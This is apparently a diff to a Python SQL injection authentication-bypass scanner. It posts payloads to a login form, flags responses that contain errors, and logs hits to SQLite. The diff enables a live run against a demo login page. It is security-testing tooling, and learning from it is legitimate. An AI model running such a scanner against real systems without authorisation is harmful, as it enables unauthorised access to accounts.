@@ -62,7 +62,7 @@ async def auth_SQL_inj_binary(urls):
                         ##############################################################################
                         # print(line)
                         ack = requests.post(url=urls, data=params,verify=False) #* send a post requests with a payload
-                        print(f"[{datetime.now()}]",Fore.RESET+Fore.LIGHTRED_EX+"|Current payload: |", Fore.RESET+Fore.LIGHTYELLOW_EX+line ,"|with status code|:",Fore.RESET+Fore.MAGENTA+ack.status_code) #* prints the current status code with its payload
+                        print(f"[{datetime.now()}]",Fore.RESET+Fore.LIGHTRED_EX+"|Current payload: |", Fore.RESET ,"|with status code|:",Fore.RESET+Fore.MAGENTA+ack.status_code) #* prints the current status code with its payload
                         # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                         await asyncio.sleep(5) #! This prevent the program from crashing 
                         if "error" in ack.text: #* if the error word was in the test result we inform the user
@@ -109,7 +109,7 @@ async def auth_SQL_inj_binary(urls):
         # capturesAUTHBYPASS.append(str(htmlVULN))
         # capturesAUTHBYPASS.append(str(vuln))
         # await create_database_for_Captures()
-        conn = sqlite3.connect("ResultCap.db")
+        conn = sqlite3.connect("SQLJresult.db")
         cur = conn.cursor()
 
         sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
@@ -179,4 +179,4 @@ async def auth_SQL_inj_binary(urls):
 async def auth_main(urL):
     await auth_SQL_inj_binary(urL)
 
-# asyncio.run(auth_SQL_inj_binary("http://testfire.net/login.jsp"))
+asyncio.run(auth_SQL_inj_binary("http://testfire.net/login.jsp"))
